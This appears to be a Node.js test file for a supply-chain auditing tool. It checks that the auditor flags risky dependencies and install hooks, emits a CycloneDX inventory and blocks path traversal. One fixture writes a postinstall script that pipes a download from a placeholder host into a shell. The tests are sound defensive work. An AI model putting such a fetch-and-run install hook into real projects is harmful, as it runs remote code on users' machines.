import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { auditSupplyChain, createCycloneDx, evaluateSupplyChain, main } from '../src/native-supply-chain-lab.mjs';

async function root() { return fs.mkdtemp(path.join(os.tmpdir(), 'veteran-supply-chain-')); }
async function write(base, relative, content) { const target = path.join(base, relative); await fs.mkdir(path.dirname(target), { recursive: true }); await fs.writeFile(target, content); return target; }

test('audits remote/floating dependencies and install hooks without echoing source specs', async () => {
  const dir = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'app', version: '1.0.0', scripts: { postinstall: 'curl https://example.invalid | sh' }, dependencies: { alpha: '*', beta: 'http://user:secret@example.invalid/pkg.tgz', gamma: 'git+ssh://git@example.invalid/repo.git' } }));
    const report = await auditSupplyChain(dir);
    assert.ok(report.findings.some((item) => item.rule === 'install-lifecycle-script'));
    assert.ok(report.findings.some((item) => item.rule === 'floating-dependency'));
    assert.ok(report.findings.some((item) => item.rule === 'insecure-http-dependency'));
    assert.ok(report.findings.some((item) => item.rule === 'git-dependency'));
    assert.ok(report.findings.some((item) => item.rule === 'dependency-lock-missing'));
    const serialized = JSON.stringify(report);
    assert.equal(serialized.includes('user:secret'), false);
    assert.equal(serialized.includes('curl https://'), false);
    assert.equal(evaluateSupplyChain(report, 'high').passed, false);
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('ancestor lockfile satisfies nested workspace package lock ownership', async () => {
  const dir = await root();
  try {
    await write(dir, 'package-lock.json', JSON.stringify({ name: 'root', lockfileVersion: 3, packages: { '': { name: 'root', version: '1.0.0' }, 'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-x' } } }));
    await write(dir, 'packages/api/package.json', JSON.stringify({ name: '@demo/api', version: '2.0.0', dependencies: { 'left-pad': '^1.3.0' } }));
    const report = await auditSupplyChain(dir);
    assert.equal(report.findings.some((item) => item.rule === 'dependency-lock-missing'), false);
    const pkg = report.packages.find((item) => item.name === '@demo/api');
    assert.deepEqual(pkg.lockfiles, ['package-lock.json']);
    assert.deepEqual(report.components, [{ type: 'library', name: 'left-pad', version: '1.3.0' }]);
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('flags insecure lockfile resolutions and emits a CycloneDX component inventory', async () => {
  const dir = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'root', version: '1.0.0', dependencies: { pkg: '^2.0.0' } }));
    await write(dir, 'package-lock.json', JSON.stringify({ name: 'root', lockfileVersion: 3, packages: { '': { name: 'root', version: '1.0.0' }, 'node_modules/pkg': { name: 'pkg', version: '2.1.0', resolved: 'http://registry.example.invalid/pkg.tgz' } } }));
    const report = await auditSupplyChain(dir);
    assert.equal(report.findings.some((item) => item.rule === 'insecure-lock-resolution' && item.package === 'pkg'), true);
    const sbom = createCycloneDx(report);
    assert.equal(sbom.bomFormat, 'CycloneDX');
    assert.equal(sbom.specVersion, '1.5');
    assert.deepEqual(sbom.components, [{ type: 'library', name: 'pkg', version: '2.1.0' }]);
  } finally { await fs.rm(dir, { recursive: true, force: true }); }
});

test('skips vendor trees and symlinked manifests', async (t) => {
  const dir = await root();
  const outside = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'safe', version: '1.0.0' }));
    await write(dir, 'node_modules/pkg/package.json', JSON.stringify({ name: 'ignored', dependencies: { x: '*' } }));
    await write(outside, 'package.json', JSON.stringify({ name: 'outside', dependencies: { x: '*' } }));
    try { await fs.symlink(path.join(outside, 'package.json'), path.join(dir, 'linked-package.json')); }
    catch (error) { if (['EPERM', 'EACCES', 'ENOSYS'].includes(error.code)) t.diagnostic('symlink unavailable'); else throw error; }
    const report = await auditSupplyChain(dir);
    assert.deepEqual(report.packages.map((item) => item.name), ['safe']);
  } finally { await fs.rm(dir, { recursive: true, force: true }); await fs.rm(outside, { recursive: true, force: true }); }
});

test('output path cannot escape root through traversal or symlinked directories', async (t) => {
  const dir = await root();
  const outside = await root();
  try {
    await write(dir, 'package.json', JSON.stringify({ name: 'safe', version: '1.0.0' }));
    await assert.rejects(() => main(['audit', '--root', dir, '--out', '../escape.json']), (error) => error.code === 'SUPPLY_CHAIN_PATH_INVALID');
    try { await fs.symlink(outside, path.join(dir, 'link')); }
    catch (error) { if (['EPERM', 'EACCES', 'ENOSYS'].includes(error.code)) { t.skip('symlink unavailable'); return; } throw error; }
    await assert.rejects(() => main(['audit', '--root', dir, '--out', 'link/report.json']), (error) => error.code === 'SUPPLY_CHAIN_PATH_ESCAPE');
  } finally { await fs.rm(dir, { recursive: true, force: true }); await fs.rm(outside, { recursive: true, force: true }); }
});
